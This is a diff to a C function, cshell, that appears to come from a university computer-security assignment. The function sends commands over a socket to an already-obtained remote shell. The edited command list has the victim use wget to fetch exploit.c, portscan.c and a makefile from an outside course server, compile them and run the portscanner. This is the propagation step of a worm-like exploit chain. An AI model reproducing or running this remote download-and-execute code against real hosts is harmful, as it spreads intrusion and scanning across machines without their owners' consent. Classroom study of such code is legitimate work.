@@ -282,21 +282,25 @@ void cshell (int sock) {
         char    buf2[2];
         fd_set  rfds;
 
-        char *commands[4] = {   
+        char *commands[8] = {   
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/portscan.c\n",
                                 "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/exploit.c\n",
-                                "gcc -o portscan portscan.c exploit.c\n",
+                                "wget http://www.inf.ufpr.br/rdmgreca/CompSec/trab3/makefile\n",
+                                "gcc -c portscan.c\n",
+                                "gcc -c exploit.c\n",
+                                "gcc -o portscan portscan.o exploit.o\n",
+                                "make\n",
                                 "./portscan > portscan.out\n"
         };
 
         int i;
-        for(i=0; i<4; i++) {
+        for(i=0; i<8; i++) {
             printf("sending command '%s", commands[i]);
             write (sock, commands[i], strlen(commands[i]));
-            // sleep(3);
-            // if (i == 1) {
-            sleep(5);
-            // }
+            sleep(10);
+            if ((i == 2) || (i == 7)) {
+                sleep(20);
+            }
         }
         
 
